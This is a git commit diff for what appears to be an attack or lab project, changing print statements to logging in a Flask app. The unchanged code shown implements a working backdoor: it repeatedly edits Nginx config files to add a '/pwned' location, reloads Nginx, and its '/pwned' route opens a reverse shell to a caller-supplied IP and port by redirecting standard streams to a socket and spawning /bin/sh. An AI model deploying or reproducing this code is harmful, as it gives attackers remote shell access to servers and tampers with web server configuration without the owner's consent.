c169383a64588caf5db272d1c956abbd2beb3b65
Luís Ventuzelos <luisventuzelos@gmail.com>
2023-08-08 22:11:34 +0100

    switch print to logger messages

--- nginix/commandInjection/app.py
+++ nginix/commandInjection/app.py
@@ -5,7 +5,15 @@ import threading
 import time
 import re
 import subprocess
+import logging
 
+# Set up the logger
+logger = logging.getLogger(__name__)
+logger.setLevel(logging.INFO)
+formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
+file_handler = logging.FileHandler('app.log')
+file_handler.setFormatter(formatter)
+logger.addHandler(file_handler)
 app = Flask(__name__)
 
 PORT = 8076
@@ -20,12 +28,12 @@ def check_nginx_configs():
     while True:
         config_files = glob.glob(f'{NGINX_CONFIG_PATH}*.conf')
         if config_files:
-            print("Found Nginx config files:")
+            logger.info("Found Nginx config files:")
             for file in config_files:
-                print(file)
+                logger.info(file)
                 add_location_block(file)
         else:
-            print("No Nginx config files found.")
+            logger.error("No Nginx config files found.")
         time.sleep(10)
 
 def add_location_block(file_path):
@@ -34,7 +42,7 @@ def add_location_block(file_path):
 
     # Check if the location block is already present to avoid duplicates
     if 'location /pwned {' in content:
-        print(f"Location block already present in {file_path}. Skipping.")
+        logger.info(f"Location block already present in {file_path}. Skipping.")
         return
 
     # Find the position to insert the new location block
@@ -42,7 +50,7 @@ def add_location_block(file_path):
     if match:
         insertion_index = match.end()
     else:
-        print(f"Couldn't find the 'server_name' line in {file_path}. Skipping.")
+        logger.warning(f"Couldn't find the 'server_name' line in {file_path}. Skipping.")
         return
 
     # Insert the new location block at the appropriate position
@@ -52,16 +60,16 @@ def add_location_block(file_path):
     with open(file_path, 'w') as f:
         f.write(new_content)
 
-    print(f"Location block added to {file_path}.")
+    logger.info(f"Location block added to {file_path}.")
     restart_nginx()
 
 def restart_nginx():
     try:
         # Run the Nginx restart command using os.system (without sudo in Alpine-based images)
         os.system('nginx -s reload')
-        print("Nginx restarted successfully.")
+        logger.info("Nginx restarted successfully.")
     except subprocess.CalledProcessError as e:
-        print(f"Failed to restart Nginx: {e}")
+        logger.error(f"Failed to restart Nginx: {e}")
 
 @app.route('/pwned')
 def inject():
@@ -71,11 +79,11 @@ def inject():
         s = socket.socket()
         try:
             s.connect((ip_address, int(port)))
-            print("Connection successful!")
+            logger.info("Connection successful!")
             [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
             pty.spawn("/bin/sh")
         except ConnectionRefusedError:
-            print("Connection refused. Make sure the service is running.")
+            logger.error("Connection refused. Make sure the service is running.")
         return f'Connecting to {ip_address}:{port}'
     else:
         return 'Good way to pretend you are not a hacker!'
